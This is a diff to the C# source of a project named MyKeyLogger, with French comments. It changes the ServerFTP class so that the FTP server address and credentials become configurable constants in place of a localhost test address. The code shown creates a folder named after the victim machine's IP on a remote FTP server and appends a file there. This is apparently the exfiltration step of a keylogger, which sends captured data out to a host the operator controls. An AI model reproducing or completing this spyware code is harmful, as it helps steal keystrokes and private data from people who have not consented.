@@ -7,6 +7,12 @@ namespace MyKeyLogger
 {
 	public class ServerFTP
 	{
+
+		public const string SERVER = "";
+
+		public const string USERNAME = "";
+
+		public const string PASSWORD = "";
 		// Constructeur par defaut, il y a rien dedans
 		public ServerFTP(){}
 		
@@ -38,7 +44,7 @@ namespace MyKeyLogger
 			// On poursuit le programme uniquement si le PC est connecté à Internet
 			if (myIP != null) {
 				
-				server = "ftp://127.0.0.1/" + myIP;
+				server = "ftp://" + SERVER + "/" + myIP;
 				
 				try {
 					
@@ -47,7 +53,7 @@ namespace MyKeyLogger
 					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
 					
 					// Fournit des informations d’identification
-					ftpRequest.Credentials = new NetworkCredential("test", "");
+					ftpRequest.Credentials = new NetworkCredential(USERNAME, PASSWORD);
 					
 					// Crée un répertoire sur le serveur FTP
 					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.makedirectory?view=net-5.0
@@ -77,7 +83,7 @@ namespace MyKeyLogger
 					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
 		           
 					// Fournit des informations d’identification
-					ftpRequest.Credentials = new NetworkCredential("test", "");
+					ftpRequest.Credentials = new NetworkCredential(USERNAME, PASSWORD);
 					
 					// Ajoute un fichier sur le server FTP s'il n'existe pas
 					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.appendfile?view=net-5.0
